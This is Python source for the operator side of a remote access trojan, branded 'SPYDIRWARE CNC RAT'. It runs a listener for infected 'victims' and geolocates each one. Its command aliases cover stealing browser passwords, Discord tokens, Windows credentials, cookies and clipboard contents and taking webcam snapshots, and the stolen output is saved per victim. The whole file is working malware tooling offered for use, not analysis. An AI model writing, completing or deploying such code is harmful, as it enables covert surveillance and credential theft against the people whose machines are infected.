import socket
import threading
import json
import os
import time
from datetime import datetime
from base64 import b64decode
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text

console = Console()
clients = []
aliases = []
addresses = []
geotags = []

LISTEN_PORT = 28727

COMMAND_ALIASES = {
    "ls": "list",
    "whoami": "exec whoami",
    "hostname": "exec hostname",
    "ip": "exec ipconfig",
    "cwd": "pwd",
    "cam": "webcam_snap",
    "cookies": "browser_cookies",
    "clipboard": "clipboard_dump",
    "sysinfo": "system_info",
    "programs": "installed_programs",
    "usb": "usb_history",
    "timezone": "timezone_info",
    "env": "environment_vars",
    "publicip": "public_ip",
    "users": "list_users",
    "recent": "recent_files",
    "resolution": "screen_resolution",
    "active": "active_window",
    "layout": "keyboard_layout",
    "vm": "vm_check",
    "chrome_pw": "chrome_passwords",
    "edge_pw": "edge_passwords",
    "brave_pw": "brave_passwords",
    "opera_pw": "opera_passwords",
    "discord_token": "discord_token",
    "vault": "windows_creds"
}

def banner():
    banner_text = Text("""
███████╗██████╗ ██╗   ██╗██████╗ ██╗██████╗ ██╗    ██╗ █████╗ ██████╗ ███████╗
██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗██║██╔══██╗██║    ██║██╔══██╗██╔══██╗██╔════╝
███████╗██████╔╝ ╚████╔╝ ██║  ██║██║██████╔╝██║ █╗ ██║███████║██████╔╝█████╗  
╚════██║██╔═══╝   ╚██╔╝  ██║  ██║██║██╔══██╗██║███╗██║██╔══██║██╔══██╗██╔══╝  
███████║██║        ██║   ██████╔╝██║██║  ██║╚███╔███╔╝██║  ██║██║  ██║███████╗
╚══════╝╚═╝        ╚═╝   ╚═════╝ ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
""", style="bold green")
    console.print(banner_text)
    console.print("[bold red]:: SPYDIRWARE CNC RAT ::[/bold red]")
    console.print("[bold white]Developed by AnonSpydir[/bold white]\n")

def reliable_send(client, data):
    json_data = json.dumps(data).encode()
    length = len(json_data)
    client.sendall(f"{length:<16}".encode())
    client.sendall(json_data)

def reliable_recv(client):
    length_header = client.recv(16)
    if not length_header:
        return None
    total_length = int(length_header.decode().strip())
    data = b""
    while len(data) < total_length:
        chunk = client.recv(total_length - len(data))
        if not chunk:
            break
        data += chunk
    return json.loads(data.decode())

def geoip_lookup(ip):
    try:
        import requests
        res = requests.get(f"https://ipinfo.io/{ip}/json", timeout=3)
        data = res.json()
        return f"{data.get('city', '')}, {data.get('region', '')}, {data.get('country', '')}"
    except:
        return "Unknown"

def list_victims():
    if not aliases:
        console.print("\n[bold red][!] No victims connected.[/bold red]")
        return

    table = Table(title="BOTNET VICTIMS", style="green")
    table.add_column("ID", style="cyan", justify="center")
    table.add_column("User", style="bold")
    table.add_column("OS", style="magenta")
    table.add_column("AV", style="yellow")
    table.add_column("IP", style="green")
    table.add_column("Geo", style="white")
    table.add_column("Port", style="blue")

    for i, alias in enumerate(aliases):
        user, host_os, av = alias
        ip, port = addresses[i]
        geo = geotags[i]
        table.add_row(str(i), user, host_os, av, ip, geo, str(port))

    console.print(table)

def save_output_to_file(alias, cmd, content, binary=False):
    username = alias[0].replace("@", "_")
    folder = os.path.join("data", username)
    os.makedirs(folder, exist_ok=True)
    filename = os.path.join(folder, f"{cmd}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{'bin' if binary else 'txt'}")
    mode = "wb" if binary else "w"
    with open(filename, mode, encoding=None if binary else "utf-8") as f:
        f.write(content if binary else str(content))
    return filename

def interact_with_victim(index):
    client = clients[index]
    alias = aliases[index]
    try:
        while True:
            cmd = input(f"[{alias[0]}] > ").strip()
            if cmd.lower() in ("exit", "quit"):
                console.print(f"[bold red]Leaving session with {alias[0]}...[/]")
                break

            full_cmd = COMMAND_ALIASES.get(cmd, cmd)
            reliable_send(client, full_cmd)
            result = reliable_recv(client)

            if isinstance(result, dict) and result.get("data"):
                data = b64decode(result["data"])
                filename = save_output_to_file(alias, cmd, data, binary=True)
                console.print(f"[green]Saved binary output:[/] {filename}")
            else:
                print(result)
                filename = save_output_to_file(alias, cmd, result)
                console.print(f"[cyan]Saved text output:[/] {filename}")

    except Exception as e:
        console.print(f"[bold red]Error:[/] {str(e)}")
        client.close()
        del clients[index]
        del aliases[index]
        del addresses[index]
        del geotags[index]

def accept_connections():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.bind(("0.0.0.0", LISTEN_PORT))
    except OSError:
        console.print(f"[bold red][!] Port {LISTEN_PORT} already in use.[/]")
        return

    server.listen(5)
    console.print(f"[bold green][+] Listening on port {LISTEN_PORT}...[/bold green]\n")

    while True:
        client, addr = server.accept()
        try:
            info = reliable_recv(client)
            if not info:
                continue
            alias = (f"{info.get('username')}@{info.get('hostname')}", info.get("os"), info.get("av"))
            geo = geoip_lookup(addr[0])
            clients.append(client)
            aliases.append(alias)
            addresses.append(addr)
            geotags.append(geo)
            console.print(f"[bold cyan][+] New victim:[/] {alias[0]} from {addr[0]} ({geo})")
        except Exception as e:
            console.print(f"[red][!] Error during connection:[/] {e}")
            client.close()

def show_menu():
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    console.print(Panel.fit(
        "[bold green]Commands[/bold green]\n"
        "  [cyan]victims[/cyan]       - List connected victims\n"
        "  [cyan]interact <id>[/cyan] - Interact with a victim\n"
        "  [cyan]aliases[/cyan]       - Show command aliases\n"
        "  [cyan]clear[/cyan]         - Clear screen\n"
        "  [cyan]exit[/cyan]          - Exit",
        title="BOTNET CNC MENU", border_style="bright_green")
    )

def main():
    show_menu()
    threading.Thread(target=accept_connections, daemon=True).start()
    while True:
        try:
            choice = input("\n[SPYDIRWARE] > ").strip()
            if choice in ("victims", "refresh"):
                list_victims()
            elif choice.startswith("interact"):
                try:
                    _, idx = choice.split()
                    interact_with_victim(int(idx))
                except:
                    console.print("[!] Usage: interact <id>")
            elif choice == "clear":
                show_menu()
            elif choice == "aliases":
                console.print("\n[bold green]Command Aliases:[/]")
                for k, v in COMMAND_ALIASES.items():
                    print(f"  {k:<14} → {v}")
            elif choice == "exit":
                console.print("[bold red]Exiting SPYDIRWARE...[/]")
                break
            else:
                console.print("[!] Unknown command.")
        except KeyboardInterrupt:
            break

if __name__ == "__main__":
    main()
